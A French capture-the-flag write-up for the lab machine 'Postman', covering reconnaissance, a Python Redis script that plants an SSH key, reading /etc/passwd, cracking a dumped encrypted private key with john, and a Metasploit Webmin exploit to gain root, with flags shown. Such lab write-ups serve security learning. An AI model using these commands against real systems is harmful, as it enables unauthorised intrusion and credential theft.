Write-Up pour la machine : POSTMAN


Postman est une machine identifiée comme "easy".


1). Nmap
Nous commencerons par une phase de reconnaissance à l'aide de Nmap avec la commande `nmap -sV -T4 -v 10.10.10.160`
    -sV : permet de sonder les ports pour déterminer le service et la version derrière le port.
    -T4 : Determine le timing de l'attaque (sa vitesse)
    -v : pour avoir une sortie davantage verbeuse.
    -p- : permet de scanner tous les ports (0-65 535)



2). Exploitation
Nous avons un serveur SSH en écoute sur le port 22
Nous avons un serveur web en écoute sur le port 80
Nous avons un serveur redis en écoute sur le port 6379
Nous avons un Webmin en écoute sur le port 10000

Redis est en version 4.09, ce qui permet l'execution de code a distance sans être authentifié.

Pour cela j'ai utilisé un petit script en python. Il permet d'injecter une clé RSA précedemment générée et de se connecter ensuite.

Pour cela `python redis.py 10.10.10.160 redis`
Voici un petit extrait :
```python
cmd = "redis-cli -h " + ip_address + ' flushall'
cmd1 = "redis-cli -h " + ip_address
os.system(cmd)
cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
os.system(cmd2)
cmd3 = cmd1 + ' config set dbfilename "backup.db" '
cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
cmd6 = cmd1 + ' save'
os.system(cmd3)
os.system(cmd4)
os.system(cmd5)
os.system(cmd6)
```

Avec un `cat /etc/passwd` nous voyons un utilisateur Matt :
```
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
```

Je décide donc de faire un `find / -user Matt 2>/dev/null`
On voit rapidement un fichier intéressant `/opt/id_rsa.bak`
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

J'utilise ssh2john.py pour formater la clé dans un format compréhensible par JTR.

`./run/ssh2john.py ../key >> ~/Bureau/key_format_john`


J'execute ensuite `john key_format_john --wordlist=/usr/share/wordlists/rockyou.txt`
Resultat : `computer2008`

Il ne reste plus qu'a faire
`redis@Postman:~$ su Matt`
`cat ~/user.txt`
FLAG user : 517ad0ec2458ca97af8d93aac08a2f3c


Passons a présent au Root user.
Il y'a une CVE dans Webmin permettant de devenir Root avec un utilisateur présent dans le système Linux pour cela nous allons utiliser `Matt` et son password `computer2008`

Pour cela nous allons utiliser Metasploit.

```
msf5 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
msf5 > use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > set SSL true
msf5 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
msf5 exploit(linux/http/webmin_packageup_rce) > exploit
```

```
id
uid=0(root) gid=0(root) groups=0(root)
```

```
cat /root/root.txt
a257741c5bed8be7778c6ed95686ddce
```

FLAG Root : a257741c5bed8be7778c6ed95686ddce

